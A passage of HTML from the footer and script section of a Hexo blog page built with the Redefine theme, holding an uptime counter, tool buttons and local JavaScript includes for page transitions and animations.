M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span> <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.4.4</a></span></div><div>Blog up for <span class="odometer" id="runtime_days"></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec</div><script data-swup-reload-script>try{function odometer_init(){document.querySelectorAll(".odometer").forEach(e=>{new Odometer({el:e,format:"( ddd).dd",duration:200})})}odometer_init()}catch(e){}</script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="article-tools-list"><li class="right-bottom-tools page-aside-toggle"><i class="fa-regular fa-outdent"></i></li><li class="go-comment"><i class="fa-regular fa-comments"></i></li></ul></div></div><div class="right-side-tools-container"><div class="side-tools-container"><ul class="hidden-tools-list"><li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-plus"></i></li><li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-minus"></i></li><li class="right-bottom-tools tool-expand-width flex justify-center items-center"><i class="fa-regular fa-expand"></i></li><li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center"><i class="fa-regular fa-moon"></i></li><li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center"><i class="fa-regular fa-arrow-down"></i></li></ul><ul class="visible-tools-list"><li class="right-bottom-tools toggle-tools-list flex justify-center items-center"><i class="fa-regular fa-cog fa-spin"></i></li><li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="image-viewer-container"><img src=""></div></main><script src="/js/libs/Swup.min.js"></script><script src="/js/libs/SwupSlideTheme.min.js"></script><script src="/js/libs/SwupScriptsPlugin.min.js"></script><script src="/js/libs/SwupProgressPlugin.min.js"></script><script src="/js/libs/SwupScrollPlugin.min.js"></script><script>const swup=new Swup({plugins:[new SwupScriptsPlugin({optin:!0}),new SwupProgressPlugin,new SwupScrollPlugin({offset:80}),new SwupSlideTheme({mainElement:".main-content-body"})],containers:["#swup"]});swup.hooks.on("page:view",()=>{Global.refresh()})</script><script src="/js/utils.js" type="module"></script><script src="/js/main.js" type="module"></script><script src="/js/layouts/navbarShrink.js" type="module"></script><script src="/js/tools/scrollTopBottom.js" type="module"></script><script src="/js/tools/lightDarkSwitch.js" type="module"></script><script src="/js/layouts/categoryList.js" type="module"></script><script src="/js/tools/codeBlock.js"></script><script src="/js/layouts/lazyload.js"></script><script src="/js/tools/runtime.js"></script><script src="/js/libs/odometer.min.js"></script><link rel="stylesheet" href="/assets/odometer-theme-minimal.css"><script src="/js/libs/Typed.min.js"></script><script src="/js/plugins/typed.js"></script><div class="post-scripts" data-swup-reload-script><script src="/js/libs/anime.min.js"></script><script src="/js/tools/tocToggle.js" type="module"></script><script src="/js/layouts/toc.js" type="module"></script><script src="/js/plugins/tabs.js" type="module"></script></div></body></html>